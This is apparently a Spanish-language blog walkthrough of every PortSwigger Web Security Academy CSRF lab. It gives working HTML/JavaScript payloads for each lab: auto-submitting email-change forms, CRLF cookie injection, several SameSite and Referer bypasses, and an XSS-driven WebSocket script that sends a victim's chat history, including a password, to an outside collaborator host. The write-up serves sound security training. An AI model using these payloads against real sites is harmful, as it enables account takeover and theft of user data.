---
layout: single
title: CSRF - PortSwigger
excerpt: "All Cross-site request forgery labs of PortSwigger."
date: 2025-08-02
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - CSRF
---


## CSRF Tips

- Enviar formulario automáticamente

```javascript
document.forms[0].submit()
```

- Establecer nueva cookie desde otra url

```javascript
Set-Cookie csrfKey=gDKK2S2ebM4XkeKJ6uXhOekMN7y7JweE; SameSite=None
```

- Method override

```javascript
&_method=POST
```

- Deshabilitar referrer

```html
<meta name="referrer" content="no-referrer">
```

- Habilitar url entera en el referrer

```html
<meta name="referrer" content="unsafe-url">
```

## CSRF sin ningún tipo de defensa || CSRF vulnerability with no defenses

![](/img2/Pasted%20image%2020250730201136.png)

> No existe ningún token csrf, lo cual nos permite crear nosotros el formulario en HTML y enviarlo automáticamente.

![](/img2/Pasted%20image%2020250730201316.png)

![](/img2/Pasted%20image%2020250730201952.png)

![](/img2/Pasted%20image%2020250730201535.png)

> Copiamos el formulario de la web y ejecutamos la función 'document.forms[0].submit' de javascript para enviar el formulario automáticamente.

- Injection

```html
<form class="login-form" name="change-email-form" action="https://0ae900a904fe323e8086e4ec00d200e7.web-security-academy.net/my-account/change-email" method="POST">
    <input  type="hidden" name="email" value="csrf@csrf.com">
</form>
<script>
      document.forms[0].submit();
</script>
```

## CSRF con token validado según el método HTTP || CSRF where token validation depends on request method

![](/img2/Pasted%20image%2020250730202424.png)

> Vemos que la url permite el método GET.

![](/img2/Pasted%20image%2020250730202540.png)

![](/img2/Pasted%20image%2020250730202614.png)

> Si quitamos el token csrf también nos permite enviar la petición.

![](/img2/Pasted%20image%2020250730202711.png)

- Injection

```html
<script>
location="https://0a9100e204c0866080e0c14800db0007.web-security-academy.net/my-account/change-email/?email=pwnd@pwnd.com";
</script>
```

## CSRF con validación solo si hay token presente || CSRF where token validation depends on token being present

![](/img2/Pasted%20image%2020250730205902.png)

![](/img2/Pasted%20image%2020250730210137.png)

> Si quitamos el token csrf la web nos sigue dejando mandar la petición.

![](/img2/Pasted%20image%2020250730210511.png)

- Injection

```html
<form class="login-form" name="change-email-form" action="https://0a3300e0032239808045123400680052.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwnd@pwnd.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

## CSRF con token no vinculado a la sesión || CSRF where token is not tied to user session

![](/img2/Pasted%20image%2020250730222440.png)

> Para tener las dos sesiones iniciadas, es necesario usar dos navegadores distintos, ya que sino se estaría arrastrando la cookie de sesión.

![](/img2/Pasted%20image%2020250730222715.png)

> En la sesión de Carlos nos copiamos la cookie de sesión.

![](/img2/Pasted%20image%2020250730222848.png)

![](/img2/Pasted%20image%2020250730222940.png)

> Vemos que podemos cambiar el email con el token csrf de wiener y la cookie de sesión de carlos.

![](/img2/Pasted%20image%2020250730223342.png)

- Injection

```html
<form class="login-form" name="change-email-form" action="https://0a1f0069041a493c8490183900000068.web-security-academy.net/my-account/change-email" method="POST">
    <input  type="hidden" name="email" value="csrf@csrf.com">
    <input  type="hidden" name="csrf" value="HpO8XW0JwBa2av5w0WmZBAxnvYhbiAAZ">
</form>

<script>
    document.forms[0].submit();
</script>
```

## CSRF con token atado a cookie sin sesión || CSRF where token is tied to non-session cookie

![](/img2/Pasted%20image%2020250730222440.png)

> Para tener las dos sesiones iniciadas, es necesario usar dos navegadores distintos, ya que sino se estaría arrastrando la cookie de sesión.

![](/img2/Pasted%20image%2020250731121010.png)

![](/img2/Pasted%20image%2020250731121108.png)

![](/img2/Pasted%20image%2020250731121147.png)

> Al cambiar la cookie de sesión podemos enviar la petición usando un token de 'csrfKey' y 'csrf' válido.

![](/img2/Pasted%20image%2020250731200608.png)

> En la función 'search' vemos que se está estableciendo una cookie de sesión al usuario, a través de nuestro input en el parámetro 'LastSearchTerm'.

![](/img2/Pasted%20image%2020250731201755.png)

![](/img2/Pasted%20image%2020250731202024.png)

> Con un retorno de carro y un salto de línea podemos establecer un nuevo campo donde sustituimos la cookie se sesión 'csrfKey'.

![](/img2/Pasted%20image%2020250731133210.png)

> Para que la cookie de sesión funcione correctamente es necesario añadir el parámetro 'SameSite' en None.

- Injection

```html
<form class="login-form" name="change-email-form" action="https://0a4200e9039e21c7806c942200580058.web-security-academy.net/my-account/change-email" method="POST">
    <input required="" type="hidden" name="email" value="csrf@csrf.com">
    <input required="" type="hidden" name="csrf" value="D6ja3Ds9B2ZkBSrOerYFlbZdjoyyZa1k">
</form>

<img src="https://0a4200e9039e21c7806c942200580058.web-security-academy.net/?search=testing123;%0D%0ASet-Cookie: csrfKey=FuRkmE0HpYMoTUagqBpRbDr0A1VY5LbS; SameSite=None" onerror=document.forms[0].submit()>
```

## CSRF con token duplicado en cookie || CSRF where token is duplicated in cookie

![](/img2/Pasted%20image%2020250731235620.png)

> Vemos que el token 'csrf' coincide con la cookie de sesión 'csrf'.

![](/img2/Pasted%20image%2020250731235828.png)

> Aprovechando el mismo vector de antes, podemos cambiar la cookie de sesión mediante el parámetro 'LastSearchTerm'.

![](/img2/Pasted%20image%2020250801000254.png)

- Injection

```html
<form class="login-form" name="change-email-form" action="https://0ac400e70468796f8036038700b1003c.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="">
    <input type="hidden" name="csrf" value="133lUZnimNZOkmnf5baPXZhPeTCKB6fQ">
</form>

<img src="https://0ac400e70468796f8036038700b1003c.web-security-academy.net/?search=testing123;%0D%0ASet-Cookie: csrf=133lUZnimNZOkmnf5baPXZhPeTCKB6fQ; SameSite=None" onerror=document.forms[0].submit();>
```

## Bypass de SameSite Lax con method override || SameSite Lax bypass via method override

![](/img2/Pasted%20image%2020250801185936.png)

> Vemos que el método GET no está permitido.

![](/img2/Pasted%20image%2020250801190024.png)

> Con la funciónalidad method override podemos bypassear la restricción.

![](/img2/Pasted%20image%2020250801190319.png)

- Injection

```html
<script>
location="https://0a9600d40372704980ec035a00c90044.web-security-academy.net/my-account/change-email?email=csrf@csrf.com&_method=POST"
</script>
```

## Bypass de SameSite Strict con redirección cliente || SameSite Strict bypass via client-side redirect

![](/img2/Pasted%20image%2020250801221713.png)

![](/img2/Pasted%20image%2020250801230844.png)

> La petición nos permite cambiar el método a GET, sin embargo no podemos realizar el CSRF debido a que el parámetro 'SameSite' está en Strict.

![](/img2/Pasted%20image%2020250801230956.png)

![](/img2/Pasted%20image%2020250801231056.png)

> Revisando la petición al crear un nuevo post, vemos que se ejecuta un script el cual nos redirige al post que le indiquemos con el parámetro 'postId'.

![](/img2/Pasted%20image%2020250801232015.png)

- Injection

```html
<script>
    location="https://0ac5005f03b2f8be81a1615600a3006c.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=csrf%40csrf.com%26submit=1"
</script>
```

## Bypass de SameSite Strict con dominio hermano || SameSite Strict bypass via sibling domain

![](/img2/Pasted%20image%2020250802125027.png)

> Vemos que en la cabecera CORS se está mostrando un nuevo subdominio.

![](/img2/Pasted%20image%2020250802125214.png)

![](/img2/Pasted%20image%2020250802125241.png)

> En el panel de Login existe un XSS, el cual podemos aprovechar para hacer una petición con los websockets y ver el historial del chat.

![](/img2/Pasted%20image%2020250802125737.png)

> Antes de crear una petición con websockets es necesario revisar el funcionamiento del servidor. Primero le mandamos al servidor la palabra 'READY', la cual nos devuelve todo el historial de mensajes mediante la cookie de sesión.

![](/img2/Pasted%20image%2020250802130800.png)

![](/img2/Pasted%20image%2020250802130909.png)

```bash
❯ echo "eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9" | base64 -d
```

```json
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}   
```

> Mandamos al servidor la palabra 'READY' y la respuesta del servidor la mandamos al burp collaborator. Como el SameSite está en Strict, no conseguimos arrastrar la cookie de sesión, sin embargo, podemos ejecutar el script a través del XSS anterior.

![](/img2/Pasted%20image%2020250802131556.png)

![](/img2/Pasted%20image%2020250802131645.png)

```
eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ==
eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgODRqYzB5a3drczZjN3FxM2MzbTEifQ==
eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0=
eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9
eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9
```

```bash
❯ cat data | base64 -d 
```

```json
{"user":"Hal Pline","content":"Hello, how can I help?"}
{"user":"Hal Pline","content":"No problem carlos, it&apos;s 84jc0ykwks6c7qq3c3m1"}{"user":"You","content":"I forgot my password"}
{"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"}{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"} 
```

> Encontramos las credenciales carlos:84jc0ykwks6c7qq3c3m1 dentro del historial de la víctima.

- Injection

```html
<script>
    location="https://cms-0a7a005d0342e00880800329002c0087.web-security-academy.net/login?username=%3Cscript%3E+++++var+webSocket+%3D+new+WebSocket%28%22wss%3A%2F%2F0a7a005d0342e00880800329002c0087.web-security-academy.net%2Fchat%22%29%3B++++++webSocket.onopen+%3D+function%28%29+%7B+++++++++webSocket.send%28%22READY%22%29%3B+++++%7D%3B++++++webSocket.onmessage+%3D+function%28message%29+%7B+++++++++fetch%28%22https%3A%2F%2F7aib4qn9mkaks7unl1rwx2iuklqce22r.oastify.com%2F%3Fdata%3D%22+%2B+btoa%28message.data%29%29%3B+++++%7D%3B+%3C%2Fscript%3E&password=testing123"
</script>
```

- WebSocket Script

```html
<script>
    var webSocket = new WebSocket("wss://0a7a005d0342e00880800329002c0087.web-security-academy.net/chat");

    webSocket.onopen = function() {
        webSocket.send("READY");
    };

    webSocket.onmessage = function(message) {
        fetch("https://7aib4qn9mkaks7unl1rwx2iuklqce22r.oastify.com/?data=" + btoa(message.data));
    };
</script>
```

## Bypass de SameSite Lax con refresco de cookie || SameSite Lax bypass via cookie refresh

![](/img2/Pasted%20image%2020250802201322.png)

![](/img2/Pasted%20image%2020250802201411.png)

![](/img2/Pasted%20image%2020250802201608.png)

![](/img2/Pasted%20image%2020250802201658.png)

> Al revisar el flujo de las cookies de sesión vemos que aún teniendo la sesión iniciada pasamos por un proceso de OAuth-based login. Primero se nos otorga una cookie de sesión para completar el proceso de OAuth, una vez autorizado se nos establece la cookie de sesión de la web de forma automática tras unos segundos de espera.

![](/img2/Pasted%20image%2020250802202730.png)

> Para que se emplee la cookie correcta, necesitamos hacer una petición a 'social-login' con una pausa de 5 segundos para que se emplee el redireccionamiento. Una vez haya terminado el proceso de OAuth se nos otorgará la cookie de sesión válida.

- Injection

```html
<form class="login-form" name="change-email-form" action="https://0a9f00d404c4631c802e08e600f900d2.web-security-academy.net/my-account/change-email" method="POST">
    <input  type="hidden" name="email" value="csrf@csrf.com">
</form>

<script>
    window.open=("https://0a9f00d404c4631c802e08e600f900d2.web-security-academy.net/social-login/");
    setTimeout(updateEmail,5000);
    function updateEmail(){
        document.forms[0].submit();
    }

</script>
```

## CSRF con validación Referer si el header existe || CSRF where Referer validation depends on header being present

![](/img2/Pasted%20image%2020250802211212.png)

![](/img2/Pasted%20image%2020250802211252.png)

> Vemos que se está verificando si la cabecera 'Referer' contiene el mismo origen.

![](/img2/Pasted%20image%2020250802211128.png)

> Para deshabilitar el uso de la cabecera 'Referer' podemos hacer uso de la etiqueta 'meta'.

- Injection

```html
<meta name="referrer" content="no-referrer">

<form class="login-form" name="change-email-form" action="https://0abb003b0399355e809c03a400b00098.web-security-academy.net/my-account/change-email" method="POST">
    <input  type="hidden" name="email" value="csrf@csrf.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

## CSRF con validación Referer vulnerable || CSRF with broken Referer validation

![](/img2/Pasted%20image%2020250802224530.png)

> Igual que antes la cabezera 'Referer' tiene una validación la cual no nos permite mandar peticiones desde otro dominio.

![](/img2/Pasted%20image%2020250802224748.png)

> Como el servidor no nos permite enviar una petición sin la cabecera 'Referer', podemos introducir el dominio como si fuera un directorio en la url del 'Referer'.  

![](/img2/Pasted%20image%2020250802223936.png)

> Para que la petición incluya la url entera en la cabecera 'Referer', podemos añadir la etiqueta 'meta' cambiando el contenido a 'unsafe-url'.

- Injection

```
File: /https://0a1c00180434b5818050036a000e0058.web-security-academy.net
```

```html
<meta name="referrer" content="unsafe-url">

<form class="login-form" name="change-email-form" action="https://0a1c00180434b5818050036a000e0058.web-security-academy.net/my-account/change-email" method="POST">
    <input  type="hidden" name="email" value="csrf@csrf.com">
</form>

<script>
    document.forms[0].submit();
</script>
```